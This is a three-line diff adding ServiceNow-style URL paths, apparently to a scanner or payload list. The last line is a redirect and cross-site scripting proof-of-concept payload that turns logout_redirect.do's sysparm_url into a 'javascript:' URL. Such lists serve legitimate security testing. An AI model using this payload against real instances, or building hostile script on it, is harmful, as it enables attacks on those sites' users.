@@ -1,0 +1,3 @@
+/kb_view_customer.do?sysparm_article=KB00xxxx
+/login.do
+/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
